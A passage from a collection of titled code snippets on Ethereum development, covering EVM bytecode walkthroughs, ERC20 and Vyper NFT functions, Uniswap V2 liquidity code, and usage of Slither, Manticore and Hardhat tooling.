total value held by the contract. It sets up the stack for further operations.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Décalage | Opcode     | Pile (après l'opcode)                                                      |\n| --------:| ---------- | -------------------------------------------------------------------------- |\n|       64 | CALLVALUE  | [Wei](/glossary/#wei) fourni par l'appel. Appelé `msg.value` dans Solidity |\n|       65 | PUSH1 0x06 | 6 CALLVALUE                                                                |\n|       67 | PUSH1 0x00 | 0 6 CALLVALUE                                                              |\n|       69 | DUP3       | CALLVALUE 0 6 CALLVALUE                                                    |\n|       6A | DUP3       | 6 CALLVALUE 0 6 CALLVALUE                                                  |\n|       6B | SLOAD      | Storage[6] CALLVALUE 0 6 CALLVALUE                                         |\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Implementation EVM Bytecode\nDESCRIPTION: Compiled EVM bytecode for a standard ERC20 token implementation. This bytecode includes functions for token transfers, approvals, balance checking, and other standard ERC20 operations with proper safeguards against overflow and other common issues.\n\nLANGUAGE: evm-opcodes\nCODE:\n```\nMSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP PUSH2 0xDC1 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP4 DUP4 GT ISZERO DUP3 SWAP1 PUSH2 0xF1A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xEDF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xEC4 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xF0C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP PUSH1 0x0 DUP4 DUP6 SUB SWAP1 POP DUP1 SWAP2 POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 DUP3 DUP5 ADD SWAP1 POP DUP4 DUP2 LT ISZERO PUSH2 0xFAB JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536166654D6174683A206164646974696F6E206F766572666C6F770000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP POP POP JUMP INVALID GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220746F20746865207A65726F2061 PUSH5 0x6472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH2 0x7070 PUSH19 0x6F766520746F20746865207A65726F20616464 PUSH19 0x65737345524332303A207472616E7366657220 PUSH2 0x6D6F PUSH22 0x6E7420657863656564732062616C616E636545524332 ADDRESS GASPRICE KECCAK256 PUSH21 0x72616E7366657220616D6F756E7420657863656564 PUSH20 0x20616C6C6F77616E636545524332303A20747261 PUSH15 0x736665722066726F6D20746865207A PUSH6 0x726F20616464 PUSH19 0x65737345524332303A20617070726F76652066 PUSH19 0x6F6D20746865207A65726F2061646472657373 GASLIMIT MSTORE NUMBER ORIGIN ADDRESS GASPRICE KECCAK256 PUSH5 0x6563726561 PUSH20 0x656420616C6C6F77616E63652062656C6F77207A PUSH6 0x726FA2646970 PUSH7 0x735822122081C8 BLOCKHASH CREATE DUP8 0xCE 0xF9 0x2F 0xEC 0xCB SUB STATICCALL 0xDC PUSH8 0x8B2708C331896EC5 NUMBER 0x2B 0x5D 0x4C PUSH8 0x5F27B6D3E664736F PUSH13 0x63430006020033000000000000\n```\n\n----------------------------------------\n\nTITLE: Approving Specific Token Transfer in Vyper\nDESCRIPTION: External function that allows a token owner to approve another address to transfer a specific token. It verifies the caller is the owner or an authorized operator, and prevents approvals to the current owner.\n\nLANGUAGE: python\nCODE:\n```\n@external\ndef approve(_approved: address, _tokenId: uint256):\n    \"\"\"\n    @dev Set or reaffirm the approved address for an NFT. The zero address indicates there is no approved address.\n         Throws unless `msg.sender` is the current NFT owner, or an authorized operator of the current owner.\n         Throws if `_tokenId` is not a valid NFT. (NOTE: This is not written the EIP)\n         Throws if `_approved` is the current owner. (NOTE: This is not written the EIP)\n    @param _approved Address to be approved for the given NFT ID.\n    @param _tokenId ID of the token to be approved.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    # Throws if `_approved` is the current owner\n    assert _approved != owner\n    # Check requirements\n    senderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\n    senderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\n    assert (senderIsOwner or senderIsApprovedForAll)\n    # Set the approval\n    self.idToApprovals[_tokenId] = _approved\n    log Approval(owner, _approved, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Bytecode Implementation\nDESCRIPTION: This snippet contains EVM bytecode for an ERC20 token contract with standard functionality including transfers, approvals, allowances, and balance queries. The code includes jump operations for function routing and memory operations for parameter handling.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2\n```\n\n----------------------------------------\n\nTITLE: Installing Required Dependencies\nDESCRIPTION: Commands to navigate to the JavaScript directory and install necessary packages using Yarn.\n\nLANGUAGE: sh\nCODE:\n```\ncd javascript\nyarn\n```\n\n----------------------------------------\n\nTITLE: Centering Content with Chakra UI Center Component\nDESCRIPTION: Demonstrates how to center content using Chakra UI's Center component with a specified height.\n\nLANGUAGE: tsx\nCODE:\n```\n<Center h=\"100px\">\n```\n\n----------------------------------------\n\nTITLE: Creating AmIRichAlready Smart Contract with ERC20 Dependency\nDESCRIPTION: Solidity contract that checks if a user's ERC20 token balance exceeds a threshold. It demonstrates a contract with external dependencies that we can mock for testing.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.2;\n\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract AmIRichAlready {\n    IERC20 private tokenContract;\n    uint public richness = 1000000 * 10 ** 18;\n\n    constructor (IERC20 _tokenContract) public {\n        tokenContract = _tokenContract;\n    }\n\n    function check() public view returns (bool) {\n        uint balance = tokenContract.balanceOf(msg.sender);\n        return balance > richness;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Slither ERC Check on Tether Token\nDESCRIPTION: Command to check ERC compliance of a token using Slither's check-erc tool with the Tether token address as an example.\n\nLANGUAGE: bash\nCODE:\n```\nslither-check-erc 0xdac17f958d2ee523a2206206994597c13d831ec7 TetherToken\n```\n\n----------------------------------------\n\nTITLE: Installing Hardhat-Etherscan Plugin\nDESCRIPTION: Command to install the hardhat-etherscan plugin which enables automatic verification of smart contract source code on Etherscan.\n\nLANGUAGE: text\nCODE:\n```\nnpm install --save-dev @nomiclabs/hardhat-etherscan\n```\n\n----------------------------------------\n\nTITLE: Calculating Initial Liquidity in Uniswap V2\nDESCRIPTION: Special case for the first deposit that establishes the initial token ratio. Creates a minimum liquidity that's permanently locked to prevent the pool from being completely emptied.\n\nLANGUAGE: solidity\nCODE:\n```\nuint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\nif (_totalSupply == 0) {\n    liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n   _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n```\n\n----------------------------------------\n\nTITLE: Importing SafeERC20 Library\nDESCRIPTION: Imports OpenZeppelin's SafeERC20 library which provides wrappers around ERC20 operations to handle both revert and false return scenarios consistently, improving safety when interacting with various ERC20 implementations.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Using Symbolic Values in Manticore Transactions\nDESCRIPTION: Example of creating symbolic values and buffers for transactions in Manticore. This allows exploring multiple execution paths based on different possible inputs.\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_value = m.make_symbolic_value()\nsymbolic_data = m.make_symbolic_buffer(320)\nm.transaction(caller=user_account,\n              address=contract_address,\n              data=symbolic_data,\n              value=symbolic_value)\n```\n\n----------------------------------------\n\nTITLE: Completing the Splitter() Method Jump\nDESCRIPTION: Final steps of the splitter() method that calculate the memory pointer and jump to the shared return code.\n\nLANGUAGE: evm-bytecode\nCODE:\n```\n131 | PUSH1 0x20   | 0x20 0x80\n133 | ADD          | 0xA0\n134 | PUSH2 0x00e4 | 0xE4 0xA0\n137 | JUMP         | 0xA0\n```\n\n----------------------------------------\n\nTITLE: Checking Success with Low-Level Call\nDESCRIPTION: Example of using the success boolean from a low-level call to check if the call succeeded, as an alternative to vm.expectRevert which only works with high-level contract calls.\n\nLANGUAGE: solidity\nCODE:\n```\n        (_success,) = address(worm).call(_callInput);\n        assertEq(_success, false);\n```\n\n----------------------------------------\n\nTITLE: Checking Token Ownership or Approval in Vyper\nDESCRIPTION: Internal function that determines whether a given address is allowed to transfer a specific token. The function checks if the address is the token owner, specifically approved for this token, or an approved operator for the owner.\n\nLANGUAGE: vyper\nCODE:\n```\ndef _isApprovedOrOwner(_spender: address, _tokenId: uint256) -> bool:\n    \"\"\"\n    @dev Returns whether the given spender can transfer a given token ID\n    @param spender address of the spender to query\n    @param tokenId uint256 ID of the token to be transferred\n    @return bool whether the msg.sender is approved for the given token ID,\n        is an operator of the owner, or is the owner of the token\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    spenderIsOwner: bool = owner == _spender\n    spenderIsApproved: bool = _spender == self.idToApprovals[_tokenId]\n    spenderIsApprovedForAll: bool = (self.ownerToOperators[owner])[_spender]\n    return (spenderIsOwner or spenderIsApproved) or spenderIsApprovedForAll\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Name Registration System in Ethereum (Python)\nDESCRIPTION: A simple Python-like smart contract similar to Namecoin that allows users to register names with associated values in a blockchain database. This basic implementation only permits 